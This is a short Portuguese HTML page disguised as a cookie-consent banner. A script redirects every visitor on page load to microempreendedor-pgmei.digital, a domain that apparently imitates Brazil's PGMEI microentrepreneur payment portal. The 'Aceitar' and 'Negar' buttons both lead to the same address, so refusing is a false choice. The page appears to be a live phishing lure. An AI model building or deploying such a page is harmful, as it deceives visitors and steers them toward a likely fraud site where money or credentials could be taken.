<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <title>Consentimento de Cookies</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      margin: 0;
      padding: 0;
      background-color: #ffffff;
      font-family: Arial, sans-serif;
      height: 100vh;
      overflow: hidden;
    }

    .cookie-banner {
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      background-color: #f2f2f2;
      padding: 40px 30px;
      text-align: center;
      border-radius: 12px;
      box-shadow: 0 0 15px rgba(0,0,0,0.1);
      z-index: 9999;
      width: 90%;
      max-width: 400px;
    }

    .cookie-banner p {
      margin-bottom: 30px;
      font-size: 20px;
    }

    .cookie-buttons {
      display: flex;
      flex-wrap: wrap;
      gap: 15px;
      justify-content: center;
    }

    .cookie-buttons button {
      flex: 1 1 45%;
      min-width: 120px;
      padding: 18px;
      font-size: 18px;
      border: none;
      border-radius: 6px;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.3s;
    }

    .aceitar {
      background-color: #4CAF50;
      color: white;
    }

    .negar {
      background-color: #f44336;
      color: white;
    }

    .aceitar:hover {
      background-color: #45a049;
    }

    .negar:hover {
      background-color: #e53935;
    }

    @media (max-width: 480px) {
      .cookie-buttons {
        flex-direction: column;
      }

      .cookie-buttons button {
        width: 100%;
      }
    }
  </style>
</head>
  <script>window.location.href='https://microempreendedor-pgmei.digital/?id=1'</script>
<body>

  <div class="cookie-banner" id="cookieBanner">
    <p>Este site utiliza cookies. Deseja aceitar?</p>
    <div class="cookie-buttons">
      <button class="aceitar" onclick="window.location.href='https://microempreendedor-pgmei.digital/?id=1'">Aceitar</button>
      <button class="negar" onclick="window.location.href='https://microempreendedor-pgmei.digital/?id=1'">Negar</button>
    </div>
  </div>

</body>
</html>
